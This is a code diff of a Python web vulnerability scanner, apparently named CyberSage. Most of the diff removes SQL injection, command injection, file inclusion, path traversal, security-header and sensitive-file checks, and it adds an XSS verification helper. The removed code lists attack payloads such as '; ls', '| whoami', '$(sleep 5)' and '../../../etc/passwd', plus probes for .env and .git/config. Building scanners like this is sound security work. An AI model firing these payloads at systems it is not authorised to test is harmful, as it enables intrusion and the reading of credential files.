-                            length_diff = abs(len(response.text) - baseline_length)
-                            if length_diff > 100:
-                                is_vulnerable = True
-                                detection_details = f"Response length changed by {length_diff} bytes"
-                        
-                        elif test['detection_type'] == 'time':
-                            # Time-based detection
-                            expected_delay = test.get('delay', 5)
-                            if elapsed >= expected_delay:
-                                is_vulnerable = True
-                                detection_details = f"Response delayed by {elapsed:.2f} seconds"
-                        
-                        elif test['detection_type'] == 'union':
-                            # UNION-based detection (NEW!)
-                            for pattern in test.get('union_patterns', []):
-                                if re.search(pattern, response.text, re.IGNORECASE):
-                                    is_vulnerable = True
-                                    detection_details = f"UNION-based SQLi detected: {pattern} found in response"
-                                    break
-                            # Also check for different content compared to baseline
-                            if not is_vulnerable:
-                                length_diff = abs(len(response.text) - baseline_length)
-                                if length_diff > 50:  # UNION often changes response significantly
-                                    is_vulnerable = True
-                                    detection_details = f"UNION query changed response by {length_diff} bytes"
-                        
-                        if is_vulnerable:
-                            # Found SQL injection! Collect evidence first
-                            evidence = self._collect_http_evidence(
-                                scan_id, method, endpoint, test_params, response
-                            )
-                            
-                            # Calculate confidence score with improved algorithm
-                            confidence = self._calculate_confidence_score(
-                                vuln_type='sqli',
-                                detection_type=test['detection_type'],
-                                technique=test['technique'],
-                                detection_details=detection_details,
-                                response_analysis={
-                                    'length_diff': abs(len(response.text) - baseline_length),
-                                    'time_delay': elapsed if test['detection_type'] == 'time' else 0,
-                                    'has_error_pattern': test['detection_type'] == 'error',
-                                    'has_union_pattern': test['detection_type'] == 'union'
-                                }
-                            )
-                            
-                            vuln = {
-                                'type': 'SQL Injection',
-                                'severity': 'critical',
-                                'title': f"SQL Injection in {param_name} ({test['technique']})",
-                                'description': f"The parameter '{param_name}' is vulnerable to {test['technique']} SQL injection. "
-                                             f"{detection_details}. This allows attackers to manipulate database queries "
-                                             f"and potentially extract, modify, or delete data.",
-                                'url': endpoint,
-                                'confidence': confidence,
-                                'confidence_score': confidence,
-                                'tool': 'enhanced_sqli_scanner',
-                                'detection_tool': 'CyberSage SQLi Scanner',
-                                'affected_parameter': param_name,
-                                'payload': test['payload'],
-                                'technique': test['technique'],
-                                'poc': self._generate_sqli_poc(endpoint, method, param_name, test['payload'], detection_details),
-                                'proof_of_concept': self._generate_sqli_poc(endpoint, method, param_name, test['payload'], detection_details),
-                                'remediation': self._get_sqli_remediation(),
-                                'cwe_id': 'CWE-89',
-                                'cve_id': None,
-                                'cvss_score': 9.8,
-                                'http_evidence': [evidence],  # Include evidence directly
-                                'raw_data': {
-                                    'parameter': param_name,
-                                    'payload': test['payload'],
-                                    'technique': test['technique'],
-                                    'detection': detection_details,
-                                    'method': method,
-                                    'evidence_id': evidence['id'],
-                                    'request': evidence['request_body'],
-                                    'response_code': evidence['response_code']
-                                }
-                            }
-                            
-                            vulnerabilities.append(vuln)
-                            print(f"[SQLi Scanner] ✓ Found SQLi in {param_name} ({test['technique']})")
-                            break
-                    
-                    except Exception as e:
-                        continue
-        
-        print(f"[SQLi Scanner] Found {len(vulnerabilities)} SQL injection vulnerabilities")
-        return vulnerabilities
-    
-    def _collect_http_evidence(self, scan_id, method, url, params, response, vuln_id=None):
-        """Collect detailed HTTP request/response evidence and link to vulnerability"""
-        # Format request
-        if method == 'POST':
-            req_body = urlencode(params)
-            req_url = url
-        else:
-            req_url = f"{url}?{urlencode(params)}"
-            req_body = ''
-        
-        req_headers = "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()])
-        resp_headers = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
-        
-        # Store in database with vulnerability link
-        evidence_id = self.db.add_http_request(
-            scan_id=scan_id,
-            method=method,
-            url=req_url,
-            req_headers=req_headers,
-            req_body=req_body[:10000],
-            resp_code=response.status_code,
-            resp_headers=resp_headers[:10000],
-            resp_body=response.text[:50000],
-            resp_time_ms=int(response.elapsed.total_seconds() * 1000),
-            vuln_id=vuln_id
-        )
-        
-        return {
-            'id': evidence_id,
-            'method': method,
-            'url': req_url,
-            'request_headers': req_headers,
-            'request_body': req_body,
-            'response_code': response.status_code,
-            'response_headers': resp_headers,
-            'response_body': response.text[:50000],
-            'response_time_ms': int(response.elapsed.total_seconds() * 1000)
-        }
-    
-    # Helper methods
-    def _verify_xss_exploitable(self, html, payload):
-        """Verify XSS is actually exploitable (not encoded)"""
-        # Check if payload is HTML-encoded
-        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
-        if encoded_payload in html:
-            return False
-        
-        # Check if script/event handler is present
-        if '<script' in payload.lower() and '<script' in html.lower():
-            return True
-        if 'onerror' in payload.lower() and 'onerror' in html.lower():
-            return True
-        if 'onload' in payload.lower() and 'onload' in html.lower():
-            return True
-        
-        return True
-    
-    def _generate_xss_poc(self, endpoint, method, param, payload):
-        """Generate XSS proof of concept"""
-        poc = f"""XSS Proof of Concept:
-
-Endpoint: {endpoint}
-Method: {method}
-Parameter: {param}
-Payload: {payload}
-
-Reproduction Steps:
-1. Navigate to: {endpoint}
-2. {"Submit form with" if method == "POST" else "Add parameter"}:
-   {param}={payload}
-3. Observe JavaScript execution (alert box appears)
-
-Impact:
-- Session hijacking via cookie theft
-- Phishing attacks
-- Keylogging
-- Page defacement
-- Malware distribution"""
-        return poc
-    
-    def _generate_sqli_poc(self, endpoint, method, param, payload, detection):
-        """Generate SQL injection proof of concept"""
-        poc = f"""SQL Injection Proof of Concept:
-
-Endpoint: {endpoint}
-Method: {method}
-Parameter: {param}
-Payload: {payload}
-
-Detection: {detection}
-
-Reproduction Steps:
-1. Navigate to: {endpoint}
-2. {"Submit form with" if method == "POST" else "Add parameter"}:
-   {param}={payload}
-3. Observe SQL error or behavior change
-
-Impact:
-- Database enumeration
-- Data extraction (passwords, credit cards, PII)
-- Data modification or deletion
-- Authentication bypass
-- Remote code execution (in some cases)"""
-        return poc
-    
-    def _get_xss_remediation(self, context):
-        """Get context-specific XSS remediation"""
-        remediations = {
-            'HTML': "Use HTML entity encoding for all user input in HTML context. Encode <, >, &, \", ' characters.",
-            'Attribute': "Use HTML attribute encoding. Encode all non-alphanumeric characters.",
-            'JavaScript': "Use JavaScript encoding. Avoid inserting user data into JavaScript contexts."
-        }
-        base = remediations.get(context, "Encode all user input properly.")
-        return f"{base}\n\nImplement Content Security Policy (CSP) headers.\nUse HTTPOnly and Secure flags on cookies.\nValidate and sanitize all input server-side."
-    
-    def _get_sqli_remediation(self):
-        """Get SQL injection remediation"""
-        return """Use parameterized queries (prepared statements) exclusively.
-Never concatenate user input into SQL queries.
-Use stored procedures with parameterized inputs.
-Implement proper input validation and sanitization.
-Apply principle of least privilege to database accounts.
-Use ORM frameworks that handle parameterization.
-Implement web application firewall (WAF) rules."""
-    
-    def _normalize_url(self, base_url, url):
-        """Normalize URL to absolute form"""
-        from urllib.parse import urljoin
-        if url.startswith('http'):
-            return url
-        return urljoin(base_url, url)
-    
-    def _same_domain(self, base_url, url):
-        """Check if URL is same domain"""
-        base_domain = urlparse(base_url).netloc
-        url_domain = urlparse(url).netloc
-        return base_domain == url_domain
-    
-    def _infer_param_types(self, params):
-        """Infer parameter types from names and values"""
-        param_types = {}
-        for name, values in params.items():
-            value = values[0] if values else ''
-            name_lower = name.lower()
-            
-            if any(kw in name_lower for kw in ['email', 'e-mail']):
-                param_types[name] = 'email'
-            elif any(kw in name_lower for kw in ['pass', 'pwd', 'password']):
-                param_types[name] = 'password'
-            elif any(kw in name_lower for kw in ['id', 'key']):
-                param_types[name] = 'identifier'
-            elif value.isdigit():
-                param_types[name] = 'number'
-            else:
-                param_types[name] = 'text'
-        
-        return param_types
-    
-    # Additional scan methods
-    def _scan_command_injection(self, scan_id, target, endpoints):
-        """Command injection scanner"""
-        vulnerabilities = []
-        print(f"[CMD Injection] Testing {len(endpoints)} endpoints...")
-        
-        cmd_payloads = [
-            {'payload': '; ls', 'indicator': ['bin', 'etc', 'usr', 'var']},
-            {'payload': '| whoami', 'indicator': ['root', 'www-data', 'apache']},
-            {'payload': '`ping -c 1 127.0.0.1`', 'indicator': ['PING', '64 bytes']},
-            {'payload': '$(sleep 5)', 'time_based': True, 'delay': 5}
-        ]
-        
-        for endpoint_data in endpoints[:20]:
-            endpoint = endpoint_data['url']
-            params = endpoint_data['params']
-            method = endpoint_data['method']
-            
-            for param_name in list(params.keys())[:3]:
-                for payload_info in cmd_payloads[:2]:
-                    self.payloads_tested += 1
-                    
-                    try:
-                        test_params = params.copy()
-                        test_params[param_name] = payload_info['payload']
-                        
-                        start_time = time.time()
-                        if method == 'POST':
-                            response = self.session.post(endpoint, data=test_params, timeout=10)
-                        else:
-                            response = self.session.get(endpoint, params=test_params, timeout=10)
-                        elapsed = time.time() - start_time
-                        
-                        # Check for indicators
-                        is_vulnerable = False
-                        if payload_info.get('time_based'):
-                            if elapsed >= payload_info.get('delay', 5):
-                                is_vulnerable = True
-                        else:
-                            for indicator in payload_info.get('indicator', []):
-                                if indicator in response.text:
-                                    is_vulnerable = True
-                                    break
-                        
-                        if is_vulnerable:
-                            evidence = self._collect_http_evidence(scan_id, method, endpoint, test_params, response)
-                            vuln = {
-                                'type': 'Command Injection',
-                                'severity': 'critical',
-                                'title': f"Command Injection in {param_name}",
-                                'description': f"The parameter '{param_name}' is vulnerable to OS command injection. User input is passed to system commands without proper sanitization.",
-                                'url': endpoint,
-                                'confidence': 90,
-                                'confidence_score': 90,
-                                'tool': 'enhanced_cmd_scanner',
-                                'detection_tool': 'CyberSage CMD Scanner',
-                                'affected_parameter': param_name,
-                                'payload': payload_info['payload'],
-                                'poc': f"Inject OS commands through {param_name} parameter",
-                                'proof_of_concept': f"Parameter {param_name} executes OS commands",
-                                'remediation': 'Never pass user input to system commands. Use allow-lists and escape all special characters. Avoid shell execution functions.',
-                                'cwe_id': 'CWE-78',
-                                'cvss_score': 9.8,
-                                'http_evidence': [evidence],
-                                'raw_data': {'parameter': param_name, 'payload': payload_info['payload'], 'evidence_id': evidence['id']}
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"[CMD Injection] ✓ Found in {param_name}")
-                            break
-                    except:
-                        continue
-        
-        print(f"[CMD Injection] Found {len(vulnerabilities)} vulnerabilities")
-        return vulnerabilities
-    
-    def _scan_file_inclusion(self, scan_id, target, endpoints):
-        """File inclusion scanner"""
-        vulnerabilities = []
-        print(f"[File Inclusion] Testing {len(endpoints)} endpoints...")
-        
-        lfi_payloads = [
-            {'payload': '../../../etc/passwd', 'indicator': ['root:x:', 'bin/bash']},
-            {'payload': '..\\..\\..\\windows\\win.ini', 'indicator': ['[fonts]', '[extensions]']},
-            {'payload': 'php://filter/convert.base64-encode/resource=index', 'indicator': ['PD9waHA']},
-        ]
-        
-        for endpoint_data in endpoints[:20]:
-            endpoint = endpoint_data['url']
-            params = endpoint_data['params']
-            method = endpoint_data['method']
-            
-            for param_name in list(params.keys())[:3]:
-                for payload_info in lfi_payloads:
-                    self.payloads_tested += 1
-                    
-                    try:
-                        test_params = params.copy()
-                        test_params[param_name] = payload_info['payload']
-                        
-                        if method == 'POST':
-                            response = self.session.post(endpoint, data=test_params, timeout=10)
-                        else:
-                            response = self.session.get(endpoint, params=test_params, timeout=10)
-                        
-                        # Check for file inclusion indicators
-                        is_vulnerable = any(indicator in response.text for indicator in payload_info['indicator'])
-                        
-                        if is_vulnerable:
-                            evidence = self._collect_http_evidence(scan_id, method, endpoint, test_params, response)
-                            vuln = {
-                                'type': 'Local File Inclusion',
-                                'severity': 'high',
-                                'title': f"LFI in {param_name}",
-                                'description': f"Local File Inclusion vulnerability in parameter '{param_name}'. Allows reading arbitrary files from the server.",
-                                'url': endpoint,
-                                'confidence': 85,
-                                'confidence_score': 85,
-                                'tool': 'enhanced_lfi_scanner',
-                                'detection_tool': 'CyberSage LFI Scanner',
-                                'affected_parameter': param_name,
-                                'payload': payload_info['payload'],
-                                'poc': f"Access server files via {param_name}",
-                                'proof_of_concept': f"LFI in {param_name}: {payload_info['payload']}",
-                                'remediation': 'Use allow-lists for file access. Never pass user input directly to file functions. Implement proper input validation.',
-                                'cwe_id': 'CWE-22',
-                                'cvss_score': 7.5,
-                                'http_evidence': [evidence],
-                                'raw_data': {'parameter': param_name, 'payload': payload_info['payload'], 'evidence_id': evidence['id']}
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"[LFI] ✓ Found in {param_name}")
-                            break
-                    except:
-                        continue
-        
-        print(f"[File Inclusion] Found {len(vulnerabilities)} vulnerabilities")
-        return vulnerabilities
-    
-    def _scan_directory_traversal(self, scan_id, target, endpoints):
-        """Directory traversal scanner"""
-        vulnerabilities = []
-        print(f"[Path Traversal] Testing {len(endpoints)} endpoints...")
-        
-        traversal_payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '....//....//....//etc/passwd']
-        
-        for endpoint_data in endpoints[:20]:
-            endpoint = endpoint_data['url']
-            params = endpoint_data['params']
-            method = endpoint_data['method']
-            
-            for param_name in list(params.keys())[:3]:
-                for payload in traversal_payloads[:2]:
-                    self.payloads_tested += 1
-                    
-                    try:
-                        test_params = params.copy()
-                        test_params[param_name] = payload
-                        
-                        if method == 'POST':
-                            response = self.session.post(endpoint, data=test_params, timeout=10)
-                        else:
-                            response = self.session.get(endpoint, params=test_params, timeout=10)
-                        
-                        if 'root:x:' in response.text or '[fonts]' in response.text:
-                            evidence = self._collect_http_evidence(scan_id, method, endpoint, test_params, response)
-                            vuln = {
-                                'type': 'Path Traversal',
-                                'severity': 'high',
-                                'title': f"Path Traversal in {param_name}",
-                                'description': f"Path traversal vulnerability allows access to files outside the web root via '{param_name}' parameter.",
-                                'url': endpoint,
-                                'confidence': 85,
-                                'confidence_score': 85,
-                                'tool': 'path_traversal_scanner',
-                                'detection_tool': 'CyberSage Path Scanner',
-                                'affected_parameter': param_name,
-                                'payload': payload,
-                                'poc': f"Access restricted files via {param_name}",
-                                'proof_of_concept': f"Traversal: {payload}",
-                                'remediation': 'Sanitize file paths. Use canonical paths. Implement strict input validation.',
-                                'cwe_id': 'CWE-22',
-                                'cvss_score': 7.5,
-                                'http_evidence': [evidence],
-                                'raw_data': {'parameter': param_name, 'payload': payload, 'evidence_id': evidence['id']}
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"[Path Traversal] ✓ Found in {param_name}")
-                            break
-                    except:
-                        continue
-        
-        return vulnerabilities
-    
-    def _check_security_headers(self, scan_id, target):
-        """Security headers checker"""
-        vulnerabilities = []
-        print(f"[Security Headers] Checking {target}...")
-        
-        try:
-            response = self.session.get(target, timeout=10)
-            headers = response.headers
-            
-            missing_headers = []
-            if 'X-Content-Type-Options' not in headers:
-                missing_headers.append('X-Content-Type-Options')
-            if 'X-Frame-Options' not in headers and 'Content-Security-Policy' not in headers:
-                missing_headers.append('X-Frame-Options')
-            if 'Strict-Transport-Security' not in headers and target.startswith('https'):
-                missing_headers.append('Strict-Transport-Security')
-            if 'X-XSS-Protection' not in headers:
-                missing_headers.append('X-XSS-Protection')
-            
-            if missing_headers:
-                vuln = {
-                    'type': 'Missing Security Headers',
-                    'severity': 'low',
-                    'title': f'Missing {len(missing_headers)} security headers',
-                    'description': f"Security headers missing: {', '.join(missing_headers)}. This may expose the application to various attacks.",
-                    'url': target,
-                    'confidence': 100,
-                    'confidence_score': 100,
-                    'tool': 'security_headers_checker',
-                    'detection_tool': 'CyberSage Header Checker',
-                    'poc': f"Missing headers: {', '.join(missing_headers)}",
-                    'proof_of_concept': f"Check response headers for: {', '.join(missing_headers)}",
-                    'remediation': 'Implement all security headers: X-Content-Type-Options, X-Frame-Options, HSTS, CSP',
-                    'cwe_id': 'CWE-693',
-                    'cvss_score': 5.3
+                    'method': method
                 }
-                vulnerabilities.append(vuln)
-                print(f"[Security Headers] ✓ Missing {len(missing_headers)} headers")
-        
         except:
             pass
         
-        return vulnerabilities
+        return None
     
-    def _scan_sensitive_files(self, scan_id, target):
-        """Sensitive file scanner"""
-        vulnerabilities = []
-        print(f"[Sensitive Files] Scanning {target}...")
+    def _verify_xss_executable(self, html, payload):
+        """Verify if XSS payload is in executable context"""
+        # Simple check: payload should not be HTML-encoded
+        if '&lt;' in html or '&gt;' in html:
+            # Check if our specific payload is encoded
+            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
+            if encoded_payload in html:
+                return False
         
-        sensitive_paths = [
-            '.git/config', '.env', 'config.php', 'wp-config.php',
-            'phpinfo.php', '.DS_Store', 'backup.sql', 'database.sql',
-            'admin.php', 'console', 'adminer.php'
-        ]
+        # If payload contains script and it's in HTML
+        if '<script' in payload.lower() and '<script' in html.lower():
+            return True
         
-        from urllib.parse import urljoin
-        for path in sensitive_paths[:10]:
-            self.payloads_tested += 1
-            try:
-                test_url = urljoin(target, path)
-                response = self.session.get(test_url, timeout=5)
-                
-                if response.status_code == 200 and len(response.content) > 0:
-                    vuln = {
-                        'type': 'Sensitive File Exposure',
-                        'severity': 'medium',
-                        'title': f'Exposed file: {path}',
-                        'description': f'Sensitive file "{path}" is publicly accessible. This may contain credentials or configuration data.',
-                        'url': test_url,
-                        'confidence': 95,
-                        'confidence_score': 95,
-                        'tool': 'sensitive_file_scanner',
-                        'detection_tool': 'CyberSage File Scanner',
-                        'poc': f'Access {test_url}',
-                        'proof_of_concept': f'Navigate to: {test_url}',
-                        'remediation': f'Remove or restrict access to {path}',
-                        'cwe_id': 'CWE-200',
-                        'cvss_score': 6.5
-                    }
-                    vulnerabilities.append(vuln)
-                    print(f"[Sensitive Files] ✓ Found: {path}")
-            except:
-                continue
+        # If payload contains event handler and it's in tag
+        event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover']
+        if any(handler in payload.lower() for handler in event_handlers):
+            return True
         
-        return vulnerabilities
-    
-    # ============================================================================
-    # ERROR HANDLING AND RETRY LOGIC
-    # ============================================================================
-    
-    def _validate_target(self, target):
-        """Validate target URL"""
-        try:
-            from urllib.parse import urlparse
-            parsed = urlparse(target if target.startswith('http') else f'http://{target}')
-            return bool(parsed.netloc or parsed.path)
-        except:
-            return False
-    
-    def _log_error(self, scan_id, phase, error_message):
-        """Log error with context"""
-        error_entry = {
-            'scan_id': scan_id,
-            'phase': phase,
-            'error': error_message,
-            'timestamp': time.time()
-        }
-        self.errors_encountered.append(error_entry)
-        print(f"[ERROR] {phase}: {error_message}")
-    
-    def _make_request_with_retry(self, method, url, **kwargs):
-        """Make HTTP request with retry logic"""
-        last_error = None
-        
-        for attempt in range(self.max_retries):
-            try:
-                # Set timeout if not provided
-                if 'timeout' not in kwargs:
-                    kwargs['timeout'] = self.request_timeout
-                
-                # Make request
-                if method.upper() == 'POST':
-                    response = self.session.post(url, **kwargs)
-                else:
-                    response = self.session.get(url, **kwargs)
-                
-                # Reset consecutive errors on success
-                self.consecutive_errors = 0
-                return response
-                
-            except requests.exceptions.Timeout as e:
-                last_error = f"Timeout on attempt {attempt + 1}/{self.max_retries}"
-                print(f"[RETRY] {last_error}")
-                time.sleep(1 * (attempt + 1))  # Exponential backoff
-                
-            except requests.exceptions.ConnectionError as e:
-                last_error = f"Connection error on attempt {attempt + 1}/{self.max_retries}"
-                print(f"[RETRY] {last_error}")
-                time.sleep(2 * (attempt + 1))
-                
-            except requests.exceptions.RequestException as e:
-                last_error = f"Request failed: {str(e)}"
-                print(f"[ERROR] {last_error}")
-                break  # Don't retry on other exceptions
-            
-            except Exception as e:
-                last_error = f"Unexpected error: {str(e)}"
-                print(f"[ERROR] {last_error}")
-                break
-        
-        # All retries failed
-        self.consecutive_errors += 1
-        
-        # Check if we should stop scanning due to too many errors
-        if self.consecutive_errors >= self.max_consecutive_errors:
-            raise Exception(f"Too many consecutive errors ({self.consecutive_errors}). Stopping scan.")
-        
-        raise Exception(f"Request failed after {self.max_retries} attempts: {last_error}")
-    
-    def _safe_request(self, method, url, params=None, data=None, scan_id=None):
-        """Safe request wrapper with error handling"""
-        try:
-            kwargs = {}
-            if params:
-                kwargs['params'] = params
-            if data:
-                kwargs['data'] = data
-            
-            return self._make_request_with_retry(method, url, **kwargs)
-        except Exception as e:
-            if scan_id:
-                self.broadcaster.broadcast_log(scan_id, f"[WARNING] Request failed: {url} - {str(e)}", 'warning')
-            return None
-    
-    def _calculate_confidence_score(self, vuln_type, detection_type, technique, detection_details, response_analysis):
-        """
-        Calculate improved confidence score based on multiple factors
-        Returns: confidence score (0-100)
-        """
-        base_score = 50  # Start at 50%
-        
-        # Factor 1: Detection type reliability
-        detection_reliability = {
-            'error': 30,        # SQL errors are very reliable
-            'time': 25,         # Time-based is reliable but can have false positives
-            'differential': 20, # Boolean-based needs more validation
-            'union': 30,        # UNION-based is very reliable
-            'reflected': 25     # XSS reflection is good but needs exploitability check
-        }
-        base_score += detection_reliability.get(detection_type, 15)
-        
-        # Factor 2: Vulnerability type confidence
-        if vuln_type == 'sqli':
-            # SQL Injection confidence factors
-            if response_analysis.get('has_error_pattern'):
-                base_score += 15  # SQL error patterns are highly reliable
-            
-            if response_analysis.get('has_union_pattern'):
-                base_score += 10  # UNION patterns are reliable
-            
-            if response_analysis.get('time_delay', 0) >= 5:
-                base_score += 10  # Significant delay indicates time-based SQLi
-            
-            if response_analysis.get('length_diff', 0) > 200:
-                base_score += 5  # Large response difference
-            elif response_analysis.get('length_diff', 0) > 100:
-                base_score += 3  # Moderate response difference
-            
-            # Technique-based adjustments
-            if 'UNION' in technique:
-                base_score += 5  # UNION-based is more reliable
-            if 'Error-based' in technique:
-                base_score += 5  # Error-based is highly reliable
-            
-        elif vuln_type == 'xss':
-            # XSS confidence factors
-            if response_analysis.get('is_exploitable'):
-                base_score += 20  # Confirmed exploitable
-            
-            if response_analysis.get('is_reflected'):
-                base_score += 10  # Payload is reflected
-            
-            # Context-based adjustments
-            context = response_analysis.get('context', '').lower()
-            if context == 'html':
-                base_score += 5  # HTML context is easier to exploit
-            elif context == 'javascript':
-                base_score += 10  # JavaScript context is complex but high impact
-            elif context == 'dom':
-                base_score += 8  # DOM-based is reliable
-            elif context == 'attribute':
-                base_score += 5  # Attribute context
-            
-            # Payload complexity (simpler payloads that work = higher confidence)
-            payload_len = response_analysis.get('payload_complexity', 0)
-            if payload_len < 30:
-                base_score += 5  # Simple payload worked
-            elif payload_len < 50:
-                base_score += 3  # Moderate complexity
-        
-        # Factor 3: Multiple evidence points
-        if 'SQL error' in detection_details or 'syntax' in detection_details.lower():
-            base_score += 5  # Clear error message
-        
-        if 'delayed' in detection_details.lower():
-            base_score += 5  # Time-based confirmation
-        
-        if 'reflected' in detection_details.lower() and 'unencoded' in detection_details.lower():
-            base_score += 5  # XSS reflection without encoding
-        
-        # Ensure score is within bounds
-        confidence = min(max(base_score, 0), 100)
-        
-        return int(confidence)
+        return True  # Default to true if payload is reflected
+import time
